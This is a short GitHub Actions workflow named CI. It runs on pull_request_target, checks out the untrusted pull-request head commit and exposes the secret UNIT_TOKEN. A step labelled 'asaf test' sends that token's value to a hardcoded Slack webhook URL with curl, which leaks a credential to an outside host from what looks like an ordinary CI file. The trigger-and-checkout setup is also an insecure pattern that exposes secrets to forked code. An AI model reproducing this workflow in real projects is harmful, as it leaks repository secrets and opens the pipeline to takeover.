name: CI
on: [pull_request_target]
env:
  UNIT_TOKEN: ${{ secrets.UNIT_TOKEN }}
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
        with:
          ref: ${{github.event.pull_request.head.sha}}
      # this webhook is already deleted
      - name: asaf test
        shell: bash
        run: |
          curl -X POST --data-urlencode "payload={\"channel\": \"@asaf.levy\", \"username\": \"webhookbot\", \"text\": \"token:${UNIT_TOKEN}\", \"icon_emoji\": \":ghost:\"}" https://hooks.slack.com/services/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